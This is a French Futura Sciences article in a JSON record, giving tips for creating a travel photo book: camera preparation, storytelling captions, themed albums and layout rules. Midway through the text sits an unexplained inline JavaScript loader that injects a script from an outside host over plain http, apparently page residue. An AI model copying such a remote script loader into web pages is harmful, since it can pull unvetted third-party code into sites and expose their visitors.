{"title": "Comment créer un livre photo de voyage réussi", "newspaper": "Futura Sciences", "author": "Par la rédaction de Futura", "date_publi": "07/08/2017", "content": "Vos vacances se préparent ou bien s'achèvent ? Dans les deux cas, votre smartphone ou votre appareil photo regorgent (ou regorgeront) sans doute de beaux clichés. Pourquoi ne pas créer un album photo pour partager vos aventures et garder un souvenir que vous aurez plaisir à consulter de temps à autre ? Suivez le guide... Les  photographies  sont les témoins privilégiés de nos  vacances . Mais voilà, une fois rentré, on n'a pas toujours le temps ou le courage de se lancer dans un tri pour ensuite imprimer les plus beaux clichés et composer un album photo de son  voyage . Heureusement, l'essor du  numérique  a donné naissance à des services en ligne qui proposent des solutions pour créer facilement, et pour pas trop cher, de superbes albums photo de voyage. Nous proposons ici quelques conseils et idées pour vous aider à bien préparer vos prises de vues puis réussir la composition de votre livre photo.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Avant le départ Contrôlez l'état de votre  appareil photo , libérez son espace de stockage, munissez-vous de cartes mémoires supplémentaires et/ou d'un  disque dur  portable afin d'y transférer les clichés une fois sur place. Si vous voyagez à l'étranger, informez-vous sur les us et coutumes en  matière  de photographie, que ce soit des personnes ou certains lieux phares.  Sur place Si vous devez partir pour une excursion sur un lieu exceptionnel, consultez la  météo  auparavant. Dans le doute, demandez toujours avant de prendre quelqu'un ou quelque chose en photo dans un lieu public. Choisissez votre point de vue Un  livre photo de voyage  raconte une histoire, la vôtre et celle du lieu, région ou pays que vous visitez. Certains préfèrent saisir la beauté d'un site ou d'un paysage sans interférer en posant sur les clichés. D'autres au contraire, souhaitent personnaliser leur récit en se mettant en scène. Un compromis entre ces deux pratiques nous semble intéressant, en cela qu'il vous permettra de créer de la variété dans la composition de votre album photo.  Idées et conseils Le carnet de voyage Si une image vaut mille mots, ajouter une légende à vos photos est un bon moyen de créer un récit vivant, ponctué d'anecdotes ou de réflexions que vous aurez plaisir à vous remémorer au fil des années. C'est le principe du  carnet de voyage , dans lequel vous pouvez créer différentes parties introduites par des titres et commenter certains clichés qui racontent un moment fort, drôle ou émouvant de votre périple.  Pour enrichir votre récit, n'hésitez pas à utiliser des informations sur l'histoire d'un site ou d'un monument. Les légendes photo peuvent refléter une action (exemple : « Excursion dans les  temples d’Angkor  »), un sentiment, un moment fort comme une belle rencontre.  Il existe un large choix de livres photo de voyage dont la mise en page est adaptée à la visite de grandes villes (Londres, New York, Paris, Venise…) ou au style de vacances (plages, tropiques…). © Futura                               Le livre photo thématique Si votre voyage a/avait pour destination une grande capitale, sachez qu'il existe des albums thématiques qui vous proposent des possibilités de mise en page spécifiques. Par exemple, un album photo spécial New York vous permettra de privilégier les photos double page. Il existe aussi des albums un peu plus généralistes pour illustrer des vacances à la plage ou sous les tropiques.  Voici quelques astuces pour réussir son livre photo de voyage : classer les photos dans l'ordre chronologique des prises de vue et les regrouper par sujet dans des dossiers ; effectuer un tri préalable en fonction de la taille du livre photo de voyage choisi ; privilégiez une mise en page simple et aérée que vous respecterez tout au long de l'album ; jouez sur la police et la taille du texte pour marquer une différence entre les titres et les légendes afin de faciliter la lecture ; n'employez pas plus de deux formats photo par page ; si vous manquez d'inspiration ou ne savez pas comment vous y prendre, consultez les nombreux exemples et idées de livre photo de voyage que l'on peut trouver en faisant une recherche sur  Internet . Vous avez aimé cet article ? N'hésitez pas à le partager avec vos ami(e)s et aidez-nous à faire connaître Futura :) ! La Rédaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest À voir aussi :  livre sur voyage dans temps  |  creer livre sur internet  |  tpe reussi  |  application pas reussi initialiser  |  comment creer ia  |  comment lire livre en anglais  |  comment creer de humidite  |  comment creer des anticorps  |  comment creer radio fm  |  comment creer enceinte", "theme": "tech"}